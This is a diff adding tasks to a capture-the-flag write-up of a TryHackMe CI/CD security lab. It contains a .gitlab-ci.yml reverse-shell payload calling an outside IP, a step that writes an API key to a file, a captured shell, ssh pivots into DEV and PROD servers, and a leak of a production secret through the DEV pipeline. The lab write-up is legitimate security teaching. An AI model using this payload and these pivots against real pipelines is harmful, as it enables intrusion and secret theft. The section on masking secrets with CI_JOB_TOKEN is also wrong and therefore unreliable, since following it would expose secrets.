@@ -558,7 +558,7 @@ The following steps can be followed to protect both your build server and build 
 > 2. What can be used to add an additional layer of authentication security for build agents? - `Token-based authentication`
 > 3. Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? - `THM{1769f7*********15cc}`
 
-## Securing the Build Pipeline :
+## Task 8 : Securing the Build Pipeline
 
 Even if we do everything correctly, **we still have to consider that one of our developers may be compromised**. Whether the actual developer is compromised through a _social engineering attack_ or _simply their credentials being exposed_, this compromise could be the downfall of our pipeline and build. Fortunately, there are protections that can be applied!
 
@@ -660,4 +660,275 @@ Protecting your GitLab CI/CD pipeline is essential to ensure the security of you
 > 1. What can we add so that merges are raised for review instead of pushing the changes to code directly? - `merge requests`
 > 2. What should we do so that only trusted runners execute CI/CD jobs? - `limit runner access`
 > 3. Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3? - `THM{2411*********503e6}`
+
+## Task 9 : Securing the Build Environment 
+
+Next on the list is making sure that our environments are secure. The last point where a threat actor may attempt to compromise our build is at the point where we deploy the build to its environment.
+
+### Environment Segregation -
+
+A key security principle in our pipeline is to **ensure that our different environments are segregated**. 
+
+Environments are not created equal, especially in these modern times where Agile principles are used. Developers are often provided with quite a lot of access and abilities in environments other than production (PROD) and  pre-production (PREPROD).
+
+All we need to do is to ensure that developers do not have access to these sensitive environments. However, with the introduction of pipelines, this becomes a tad bit more complex. Even if we restrict direct access to these environments, there may be side channels in the pipeline that can be exploited.
+
+### One Build Agent to Rule Them All -
+
+In our next example, **Ash has learnt from his mistakes and made sure only to provide Ana with access to the development (DEV) branch. Main is now fully restricted.** We still have access to the DEV branch since Ash wants his developers to adopt an Agile development process. Luckily for us, **the DEV branch does have a Gitlab runner attached to it**.
+
+Navigate to the new repo at http://gitlab.tryhackme.loc/ash/environments/ to get started. Navigate to the Operate->Environment section to view the two environments:
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/bf394c8c-926a-4ab1-b62a-ee547a517625)
+
+Let's take a closer look at the last build that was performed for production. Click on the build and select the Pipeline tab to see the build that was executed for production:
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/a1c83e51-ea37-4d43-abce-6ec84559a9c7)
+
+Here the runner that was used for the build is `runner-agent vVz6bNA8`.
+
+We can try to make some changes in the _README.md_ file & see which runner is responsible for executing the job.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/0107b5ce-2080-4e1a-992b-96b2164ac8a5)
+
+Checking which runner executes the job:
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/c167bc94-d44e-4ebf-8810-f9ff1a4173f3)
+
+So here the runner named `_KwqiWhz` is responsible for executing the job.
+
+**Since both the PROD & DEV env is using the same runner, if we manage to make the runner execute our reverse shell payload then we can get access to prod server. From there we can pivot into the DEV server too !**
+
+1. Edit the _.gitlab-ci.yml_ file with our reverse shell payload & Commit the changes.
+```bash
+stages:
+  - test
+  - deploy
+
+test:
+  stage: test
+  script:
+    - 'echo "Testing Application: ${CI_PROJECT_NAME}"'
+
+production:
+  stage: deploy
+  when: manual
+  script:
+    - /bin/bash -i >& /dev/tcp/10.50.75.24/9001 0>&1
+    - 'echo "${API_KEY}" > /tmp/key'
+    - 'echo "Ready to use the API KEY"'
+  environment:
+    name: ${CI_JOB_NAME}
+```
+2. Create a Merge request
+3. Deploy the build to production server
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/40164099-8e55-4f56-8696-e4df1e6968d4)
+4. Voila ! We got a shell back on our machine.
+```bash
+┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
+└─# nc -lvnp 9001                     
+listening on [any] 9001 ...
+connect to [10.50.75.24] from (UNKNOWN) [10.200.94.202] 50666
+bash: cannot set terminal process group (1603): Inappropriate ioctl for device
+bash: no job control in this shell
+
+gitlab-runner@ip-10-200-94-202:~/builds/_KwqiWhz/0/ash/environments$ id
+id
+uid=1001(gitlab-runner) gid=1001(gitlab-runner) groups=1001(gitlab-runner)
+```
+
+Now from the diagram, we know that we have a shell on the **GRunner02** machine since it has the ip **10.50.75.202**.
+
+Now our aim is to pivot to the DEV(10.200.94.220) & PROD(10.200.94.230) servers.
+
+The `.bash_history` file indicates we can pivot to DEV & PROD by ssh directly.
+```
+gitlab-runner@ip-10-200-94-202:~$ ls -la
+ls -la
+total 36
+drwxr-x--- 5 gitlab-runner gitlab-runner 4096 Mar  7 08:43 .
+drwxr-xr-x 4 root          root          4096 Jul 17  2023 ..
+-rw------- 1 gitlab-runner gitlab-runner  172 Mar  7 09:21 .bash_history
+-rw-r--r-- 1 gitlab-runner gitlab-runner  223 Aug  7  2023 .bash_logout
+-rw-r--r-- 1 gitlab-runner gitlab-runner 3771 Jan  6  2022 .bashrc
+drwx------ 2 gitlab-runner gitlab-runner 4096 Mar  7 08:43 .cache
+-rw-r--r-- 1 gitlab-runner gitlab-runner  807 Jan  6  2022 .profile
+drwx------ 2 gitlab-runner gitlab-runner 4096 Mar  7 09:17 .ssh
+drwxrwxr-x 4 gitlab-runner gitlab-runner 4096 Mar  7 07:06 builds
+gitlab-runner@ip-10-200-94-202:~$ cat .bash_history
+cat .bash_history
+ssh-keygen
+cat ~/.ssh/id_rsa.pub 
+ssh ubuntu@10.200.125.220
+ssh ubuntu@10.200.125.230
+exit
+ssh ubuntu@10.200.125.220
+ssh ubuntu@10.200.94.220
+ssh ubuntu@10.200.94.230
+exit
+```
+
+### Pivot into DEV server -
+
+Since the reverse shell is not stable, I was unable to ssh into the DEV/PROD servers. 
+
+So I stabilized my shell first & then tried to ssh into the DEV server.
+
+```bash
+gitlab-runner@ip-10-200-94-202:~/.ssh$ ssh ubuntu@10.200.94.220
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 6.2.0-1009-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun May 19 08:45:30 UTC 2024
+
+  System load:  0.0                Processes:             103
+  Usage of /:   13.8% of 19.20GB   Users logged in:       0
+  Memory usage: 11%                IPv4 address for ens5: 10.200.94.220
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+55 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Mar  7 08:46:58 2024 from 10.200.94.202
+ubuntu@ip-10-200-94-220:~$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),119(netdev),120(lxd)
+```
+
+### Pivot into PROD server -
+
+```
+gitlab-runner@ip-10-200-94-202:~/.ssh$ ssh ubuntu@10.200.94.230
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 6.2.0-1009-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun May 19 08:50:39 UTC 2024
+
+  System load:  0.0                Processes:             104
+  Usage of /:   13.8% of 19.20GB   Users logged in:       0
+  Memory usage: 11%                IPv4 address for ens5: 10.200.94.230
+  Swap usage:   0%
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+55 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Mar  7 09:17:16 2024 from 10.200.94.202
+ubuntu@ip-10-200-94-230:~$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),119(netdev),120(lxd)
+```
+
+> 1. What should you do so that a compromised environment doesn't affect other environments? - `isolate environment`
+> 2. Authenticate to Mother and follow the process to claim Flag 4 from the DEV environment. What is Flag 4?- `THM{28f36e*************0883}`
+> 3. Authenticate to Mother and follow the process to claim Flag 5 from the PROD environment. What is Flag 5? - `THM{e9f9***************c93fe6}`
+
+## Task 10 : Securing the Build Secrets 
+
+Our pipeline and build are almost secure! One final step remains: **making sure that our build secrets are adequately protected**!
+
+### One Secret to Rule Them All -
+
+Larry has now finally learnt his lesson and made sure to implement segregated runners for the different environments. But there is one more issue. **While these pipelines may be segregated, we need to make sure that the secrets (or variables as they are known in Gitlab) are also segregated**. 
+
+If the scope for secrets is not narrowly defined, we can request the use of PROD secrets in our DEV build, allowing us to compromise the production environment one last time! 
+
+Navigate to the last repo we used for this exploit: http://gitlab.tryhackme.loc/ash/environments.
+
+Let's take a look at the environments and the latest builds for them, as we have done in the previous task. Taking a look at one of the production deployments, we can see that the build is making use of an `API_KEY` variable:
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/eeb3edb8-fee8-4946-807d-d6f177117f1e)
+
+As Ana, we don't have the permissions required to list the different variables, but taking a look at the DEV branch's CI file, we can see that our DEV variable is different .ie `API_KEY_DEV`.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/4a5b49ca-9321-40ee-a1fc-b7699a1ebbdd)
+
+
+In our case, the value is API_KEY_DEV. Let's make a change to this variable and also echo out the value to see if we can access the PROD variable. Make the change to the CI file in the DEV branch and see what happens!
+
+Now we (Ana) has only access to DEV env. However we can try to change the `API_KEY_DEV` to API_KEY`` in the `.gitlab-ci.yml` file in the `DEV` branch & try to execute it. While the job executes, we can se the value of the PROD env's API keybeing echoed out.
+
+First we make changes to the _.gitlab-ci.yml_ file
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/3203e417-cde5-4b60-9409-70d04204de5a)
+
+
+Now approve and merge it by ourselves.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/917bc2c2-fde6-4dd9-907c-14c422d9a635)
+
+Now if we go & check the job in pipeline, we can see the contents of the PROD environment's API_KEY .
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/833fa8b5-5222-4abe-a0b6-0e9921cc368a)
+
+
+
+### Protecting the Build Secrets -
+
+**Protecting build secrets, even when using GitLab CI/CD variables, is crucial for maintaining the security of our pipelines. GitLab CI/CD provides a feature called "masked variables" to help prevent secrets from being exposed in logs.**
+
+Here's how we can use this feature:
+
+### Masking Variables -
+
+You can mask variables in your .gitlab-ci.yml file by using the CI_JOB_TOKEN predefined variable. This token is automatically set by GitLab and can be used to mask any variable value you want to keep hidden.
+
+For example, if you have a variable named MY_SECRET_KEY, you can use it like this:
+
+```yml
+my_job:
+  script:
+    - echo "$MY_SECRET_KEY" # This will expose the secret
+    - echo "masked: $CI_JOB_TOKEN" # This will mask the secret
+```
+
+### Use Secure Variables -
+
+If you want to store secrets securely in GitLab, you can use GitLab CI/CD variables with the "Masked" option enabled. These variables are stored securely and are never exposed in job logs, even if you use them directly in your scripts. To create a secure variable:
+
+Go to the GitLab project.
+1. Navigate to Settings > CI/CD > Variables.
+2. Add a new variable, select the "Masked" checkbox, and provide the value.
+3. Once you've added a secure variable, you can use it in your .gitlab-ci.yml file without worrying about it being exposed in logs.
+
+> 1. Is using environment variables enough to protect the build secrets? (yay or nay) - nay
+> 2. What is the value of the PROD API_KEY? - THM{Secr***************.Secret}
+
+## Task 11 : Conclusion
+
+Based on the attacks and misconfigurations we saw in the previous tasks, we can understand that:
+
+- **Pipeline Security is a Priority:** Ensuring the security of your CI/CD pipeline is crucial for safeguarding code and data integrity.
+- **Access Controls are Fundamental:** Restricting access to critical branches, environments, and CI/CD variables is the first line of defence against unauthorised changes and data exposure. 
+- **Runner Security is Essential:** Properly securing the machines running your GitLab Runner, along with strong authentication, is a must to prevent breaches.
+- **Secrets Management Matters:** Safeguarding sensitive data, such as API keys and passwords, through GitLab CI/CD variables with masking and secure variables is vital. Using environment variables is not enough.
+- **Isolate Environments:** Separating development (DEV) and production (PROD) environments minimises the risk of compromising the latter through the former.
+- **Continuous Vigilance:** Regularly reviewing access permissions, scripts, and security configurations, combined with monitoring and alerting, ensures ongoing security.
+- **Education is Key:** Educating your team about security best practices is essential to maintaining a robust security posture.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/fe812aff-cef4-4886-b7a0-c934de475fae)
+
 
